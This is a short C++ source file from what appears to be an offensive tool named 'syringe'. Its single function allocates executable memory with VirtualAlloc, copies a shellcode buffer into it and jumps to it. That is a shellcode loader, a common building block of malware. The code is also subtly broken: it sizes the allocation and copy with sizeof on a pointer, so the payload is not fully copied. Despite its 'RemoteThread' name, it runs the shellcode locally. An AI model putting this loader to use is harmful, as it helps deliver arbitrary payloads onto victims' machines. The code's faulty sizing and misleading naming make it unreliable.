#include "../../includes/shellcode/remote.hpp"


/*
    *    syringe/shellcode/remote.cpp
    *    Date: 12/6/21
    *    Author: 0x1CA3
*/


void RemoteThreadShellcodeExecution::Execute(char *s) {
    void *run = VirtualAlloc(0, sizeof(s), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(run, s, sizeof(s));
    ((void(*)())run)();
}